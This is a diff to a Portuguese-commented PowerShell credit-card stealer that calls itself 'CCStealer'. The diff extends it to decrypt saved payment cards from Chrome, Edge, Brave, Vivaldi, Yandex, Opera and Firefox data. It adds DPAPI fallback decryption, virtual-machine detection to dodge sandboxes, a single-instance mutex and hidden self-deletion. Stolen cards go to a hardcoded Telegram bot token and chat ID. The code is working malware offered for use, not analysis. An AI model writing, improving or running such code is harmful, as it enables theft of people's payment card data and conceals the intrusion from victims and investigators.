@@ -17,6 +17,8 @@ param(
   [switch]$Elevate,
   [switch]$ElevatedPass,
   [switch]$Debug,
+  [switch]$SelfDelete,
+  [switch]$SkipVM,
   [string]$TelegramToken = '8181336077:AAHhL3rtCxJovQl6F4xqMoiH7j9v6DZJnPM',
   [string]$TelegramChatId = '6168636325'
 )
@@ -215,18 +217,33 @@ function Aes-Gcm-Decrypt([byte[]]$key, [byte[]]$iv, [byte[]]$ciphertext, [byte[]
 # =====================================================================
 # SQLite (via P/Invoke) - abre copia em temp p/ evitar lock do navegador
 # =====================================================================
-function Copy-DbToTemp([string]$src) {
-  $tmp = Join-Path $env:TEMP ("cc_" + [guid]::NewGuid().ToString('N') + ".sqlite")
+# copia um arquivo mesmo com lock compartilhado (navegador aberto)
+function Copy-FileShared([string]$src, [string]$dst) {
   try {
     $fs = New-Object System.IO.FileStream($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-    $dst = New-Object System.IO.FileStream($tmp, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
-    $fs.CopyTo($dst)
-    $dst.Dispose(); $fs.Dispose()
-    return $tmp
+    $dstFs = New-Object System.IO.FileStream($dst, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
+    $fs.CopyTo($dstFs)
+    $dstFs.Dispose(); $fs.Dispose()
+    return $true
   } catch {
-    [System.IO.File]::Copy($src, $tmp, $true)
-    return $tmp
+    try { [System.IO.File]::Copy($src, $dst, $true); return $true } catch { return $false }
   }
+}
+
+# remove o DB em temp + sidecars -wal/-shm (SPT PASSO 2)
+function Remove-TempDb([string]$tmp) {
+  foreach ($s in @('', '-wal', '-shm')) { Remove-Item ($tmp + $s) -Force -ErrorAction SilentlyContinue }
+}
+
+function Copy-DbToTemp([string]$src) {
+  $tmp = Join-Path $env:TEMP ("cc_" + [guid]::NewGuid().ToString('N') + ".sqlite")
+  [void](Copy-FileShared $src $tmp)
+  # SPT PASSO 1: copia os sidecars -wal/-shm (Chrome/Edge rodam em WAL mode;
+  # a tabela credit_cards pode viver so no -wal). best-effort.
+  foreach ($suffix in @('-wal', '-shm')) {
+    if (Test-Path ($src + $suffix)) { [void](Copy-FileShared ($src + $suffix) ($tmp + $suffix)) }
+  }
+  return $tmp
 }
 
 function Get-ColCell([IntPtr]$stmt, [int]$c) {
@@ -292,24 +309,37 @@ function Get-TableColumns([string]$dbPath) {
   return $cols
 }
 
+# SPT PASSO 5: checa se a tabela existe (distinguir 'ausente' de 'sem coluna')
+function Test-TableExists([string]$dbPath, [string]$table) {
+  $rows = Sqlite-Query $dbPath "SELECT name FROM sqlite_master WHERE type='table' AND name='$table'"
+  return ($rows.Count -gt 0)
+}
+
 # =====================================================================
 # Descriptografia do BLOB "v10" (os_crypt)
 # =====================================================================
 function Decrypt-VCrypt([byte[]]$blob, [byte[]]$aesKey) {
-  if ($null -eq $blob -or $blob.Length -lt 31) { return $null }
+  if ($null -eq $blob -or $blob.Length -lt 3) { return $null }
   $p0 = [char]$blob[0]; $p1 = [char]$blob[1]; $p2 = [char]$blob[2]
-  if (-not (($p0 -eq 'v' -or $p0 -eq 'V') -and $p1 -eq '1' -and $p2 -eq '0')) { return $null }
-  $nonce = New-Object byte[] 12
-  [Array]::Copy($blob, 3, $nonce, 0, 12)
-  $tag = New-Object byte[] 16
-  [Array]::Copy($blob, $blob.Length - 16, $tag, 0, 16)
-  $cipherLen = $blob.Length - 31
-  if ($cipherLen -lt 0) { return $null }
-  $cipher = New-Object byte[] $cipherLen
-  [Array]::Copy($blob, 15, $cipher, 0, $cipherLen)
-  $res = Aes-Gcm-Decrypt $aesKey $nonce $cipher $tag
-  if (-not $res.TagOk) { return $null }
-  return $res.Plaintext
+  if (($p0 -eq 'v' -or $p0 -eq 'V') -and $p1 -eq '1' -and $p2 -eq '0') {
+    # caminho v10 (os_crypt AES-256-GCM)
+    if ($blob.Length -lt 31) { return $null }
+    $nonce = New-Object byte[] 12
+    [Array]::Copy($blob, 3, $nonce, 0, 12)
+    $tag = New-Object byte[] 16
+    [Array]::Copy($blob, $blob.Length - 16, $tag, 0, 16)
+    $cipherLen = $blob.Length - 31
+    if ($cipherLen -lt 0) { return $null }
+    $cipher = New-Object byte[] $cipherLen
+    [Array]::Copy($blob, 15, $cipher, 0, $cipherLen)
+    $res = Aes-Gcm-Decrypt $aesKey $nonce $cipher $tag
+    if (-not $res.TagOk) { return $null }
+    return $res.Plaintext
+  }
+  # SPT PASSO 4: fallback DPAPI (alguns builds/versoes protegem o BLOB direto com DPAPI)
+  $dp = Dpapi-Unprotect $blob
+  if ($dp) { return $dp }
+  return $null
 }
 
 # =====================================================================
@@ -358,6 +388,24 @@ function Test-Admin {
   } catch { return $false }
 }
 
+# SPT PASSO 8: detecta VM (VirtualBox/VMware/Hyper-V/QEMU/KVM) via WMI
+function Test-IsVM {
+  try {
+    $cs = Get-CimInstance Win32_ComputerSystem
+    $bios = Get-CimInstance Win32_BIOS
+    $markers = @('virtualbox','vmware','virtual pc','virtual machine','qemu','kvm','innotek','hyper-v','bochs','parallels','xenserver','xen','sea bios','seabios')
+    $hay = @()
+    if ($cs) { $hay += $cs.Manufacturer; $hay += $cs.Model }
+    if ($bios) { $hay += $bios.Manufacturer; $hay += $bios.SMBIOSBIOSVendor }
+    foreach ($h in $hay) {
+      if (-not $h) { continue }
+      $hl = $h.ToLower()
+      foreach ($m in $markers) { if ($hl -like "*$m*") { return $true } }
+    }
+  } catch { }
+  return $false
+}
+
 # =====================================================================
 # Coleta: Chrome/Edge (credit_cards descriptografados)
 # =====================================================================
@@ -394,7 +442,8 @@ function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
     Add-Dbg "${BrowserName}:   copia temp size=$tmpSize"
     # detecta colunas (nomes variam por versao do Chrome/Edge)
     $colNames = Get-TableColumns $tmp
-    Add-Dbg "${BrowserName}:   colunas=[$($colNames -join ', ')]"
+    $tblExists = Test-TableExists $tmp 'credit_cards'
+    Add-Dbg "${BrowserName}:   tabela credit_cards existe=$tblExists colunas=[$($colNames -join ', ')]"
     $idxName = -1; $idxNum = -1; $idxMon = -1; $idxYr = -1
     for ($i = 0; $i -lt $colNames.Count; $i++) {
       $c = $colNames[$i]
@@ -404,10 +453,14 @@ function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
       if ($c -like 'expiration_year*') { if ($idxYr -lt 0) { $idxYr = $i } }
     }
     Add-Dbg "${BrowserName}:   idx: name=$idxName num=$idxNum mon=$idxMon yr=$idxYr"
-    if ($idxNum -lt 0) { Add-Dbg "${BrowserName}:   SEM coluna de numero -> pula"; Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }
+    if ($idxNum -lt 0) {
+      if (-not $tblExists) { Add-Dbg "${BrowserName}:   TABELA credit_cards AUSENTE -> pula" }
+      else { Add-Dbg "${BrowserName}:   SEM coluna de numero -> pula" }
+      Remove-TempDb $tmp; continue
+    }
     $rows = Sqlite-Query $tmp 'SELECT * FROM credit_cards'
     Add-Dbg "${BrowserName}:   linhas credit_cards=$($rows.Count)"
-    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+    Remove-TempDb $tmp
     foreach ($r in $rows) {
       $name = if ($idxName -ge 0) { Cell-Text $r[$idxName] } else { '' }
       $num = ''
@@ -459,7 +512,7 @@ function Get-FirefoxCards([string]$profilesDir) {
     $profile = $fh.Directory.Name
     $tmp = Copy-DbToTemp $fh.FullName
     $rows = Sqlite-Query $tmp "SELECT value FROM formhistory"
-    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+    Remove-TempDb $tmp
     foreach ($r in $rows) {
       $val = Cell-Text $r[0]
       if ($val -eq '') { continue }
@@ -575,6 +628,32 @@ if ($Elevate -and -not $isAdmin -and -not $ElevatedPass) {
   }
 }
 
+# SPT PASSO 6: mutex global anti-reentrada (evita 2 instancias varrendo ao mesmo tempo)
+$script:CCStealerMutex = $null
+try {
+  $script:CCStealerMutex = New-Object System.Threading.Mutex($false, 'Global\CCStealer')
+  $acquired = $false
+  try { $acquired = $script:CCStealerMutex.WaitOne(0) } catch { $acquired = $false }
+  if (-not $acquired) {
+    Write-Output "MUTEX: outra instancia do CCStealer ja esta rodando; encerrando."
+    Add-Dbg "MUTEX: ja existe instancia ativa -> exit"
+    exit 0
+  }
+  Add-Dbg "MUTEX: Global\CCStealer adquirido"
+} catch {
+  Add-Dbg "MUTEX: falha ao criar (continua sem mutex): $_"
+}
+
+# SPT PASSO 8: anti-VM opcional (nao roubar em maquina de teste/VM)
+if ($SkipVM) {
+  if (Test-IsVM) {
+    Write-Output "SKIPVM: maquina detectada como VM; encerrando."
+    Add-Dbg "SKIPVM: VM detectada -> exit"
+    exit 0
+  }
+  Add-Dbg "SKIPVM: nao e VM (continua)"
+}
+
 # usuarios a varrer
 $users = @("$env:USERPROFILE")
 if ($ElevatedPass) {
@@ -582,18 +661,29 @@ if ($ElevatedPass) {
   foreach ($u in (Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue)) { $users += $u.FullName }
 }
 
+# SPT PASSO 9: navegadores Chromium suportados (mesma estrutura User Data)
+# Opera e apontado na raiz "Opera Software" (Local State na raiz; Web Data em "Opera Stable")
+$chromiumBrowsers = @(
+  @{ Name='Chrome';  Path='AppData\Local\Google\Chrome\User Data' },
+  @{ Name='Edge';    Path='AppData\Local\Microsoft\Edge\User Data' },
+  @{ Name='Brave';   Path='AppData\Local\BraveSoftware\Brave-Browser\User Data' },
+  @{ Name='Vivaldi'; Path='AppData\Local\Vivaldi\User Data' },
+  @{ Name='Yandex';  Path='AppData\Local\Yandex\YandexBrowser\User Data' },
+  @{ Name='Opera';   Path='AppData\Local\Opera Software' }
+)
+
 $allCards = New-Object System.Collections.Generic.List[object]
 foreach ($up in $users) {
-  $chrome = Join-Path $up 'AppData\Local\Google\Chrome\User Data'
-  $edge   = Join-Path $up 'AppData\Local\Microsoft\Edge\User Data'
-  $ff     = Join-Path $up 'AppData\Roaming\Mozilla\Firefox\Profiles'
+  $ff = Join-Path $up 'AppData\Roaming\Mozilla\Firefox\Profiles'
   Add-Dbg "USER $up"
-  Add-Dbg "  Chrome dir: $(if (Test-Path $chrome) { 'existe' } else { 'NAO existe' }) ($chrome)"
-  Add-Dbg "  Edge   dir: $(if (Test-Path $edge) { 'existe' } else { 'NAO existe' }) ($edge)"
-  Add-Dbg "  Firefox dir: $(if (Test-Path $ff) { 'existe' } else { 'NAO existe' }) ($ff)"
-  if (Test-Path $chrome) { $allCards.AddRange((Get-ChromeEdgeCards $chrome 'Chrome')) }
-  if (Test-Path $edge)   { $allCards.AddRange((Get-ChromeEdgeCards $edge 'Edge')) }
-  if (Test-Path $ff)     { $allCards.AddRange((Get-FirefoxCards $ff)) }
+  foreach ($b in $chromiumBrowsers) {
+    $dir = Join-Path $up $b.Path
+    $exists = Test-Path $dir
+    Add-Dbg "  $($b.Name) dir: $(if ($exists) { 'existe' } else { 'NAO existe' })"
+    if ($exists) { $allCards.AddRange((Get-ChromeEdgeCards $dir $b.Name)) }
+  }
+  Add-Dbg "  Firefox dir: $(if (Test-Path $ff) { 'existe' } else { 'NAO existe' })"
+  if (Test-Path $ff) { $allCards.AddRange((Get-FirefoxCards $ff)) }
 }
 $cards = @($allCards)
 
@@ -621,6 +711,20 @@ if ($NoTelegram) {
 $ok = Send-TelegramText -Text $report -Token $TelegramToken -ChatId $TelegramChatId
 if ($ok) {
   Write-Output "OK: cartoes=$($cards.Count) telegram=OK"
+  if ($SelfDelete) {
+    # SPT PASSO 7: auto-remocao pos-envio (best-effort)
+    try {
+      if ($scriptDir) {
+        Remove-Item (Join-Path $scriptDir 'sqlite3.dll') -Force -ErrorAction SilentlyContinue
+        Remove-Item (Join-Path $scriptDir 'telegram.json') -Force -ErrorAction SilentlyContinue
+      }
+      # o proprio .ps1 pode estar com lock; agenda delete tardio via cmd
+      if ($PSCommandPath) {
+        Start-Process cmd -ArgumentList '/c','timeout /t 1 >nul & del /f /q "' + $PSCommandPath + '"' -WindowStyle Hidden -ErrorAction SilentlyContinue
+      }
+      Add-Dbg "SELFDELETE: agendado ($PSCommandPath)"
+    } catch { Add-Dbg "SELFDELETE: falha: $_" }
+  }
   exit 0
 } else {
   Write-Output "FALHA: cartoes=$($cards.Count) telegram=FALHA"
